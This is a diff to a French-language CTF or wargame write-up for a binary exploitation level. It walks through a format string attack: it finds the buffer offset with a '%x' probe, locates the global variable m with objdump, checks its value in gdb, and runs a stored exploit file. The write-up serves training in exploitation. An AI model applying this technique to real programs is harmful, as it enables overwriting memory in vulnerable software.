@@ -34,16 +34,25 @@ disas p:
 
 C´est aussi une format string attack !
 
-On check la position du buffer :
+On check la position du début de notre buffer :
 python -c 'print "AAAA"+" %x"*20' | ./level4
+         1       2        3     4 5    6        7       8      9    10       11     
 AAAA b7ff26b0 bffff794 b7fd0ff4 0 0 bffff758 804848d bffff550 200 b7fd1ac0 b7ff37d0 
+   12
 41414141 20782520 25207825 78252078 20782520 25207825 78252078 20782520 25207825
 
 Il est en 12eme position =)
+
+On cherche l'adresse de m :
+objdump -t level4 -> 08049810 g     O .bss	00000004              m
+
+m est à l'adresse 0x08049810
 
 On va donc utiliser quasiment le même exploit que dans le lvl3.
 On essaie de mettre 16930116 dans m en premier :
 (gdb) x 0x8049810
 0x8049810 <m>:	0x0102554c -> on obtient un resultat proche mais pas le bon.
 
-Apres quelque ajustement on va ajouter 16930108 dans m.
+Apres quelque ajustement on va ajouter 16930112 dans m.
+
+cat /tmp/exploit4 - | ./level4
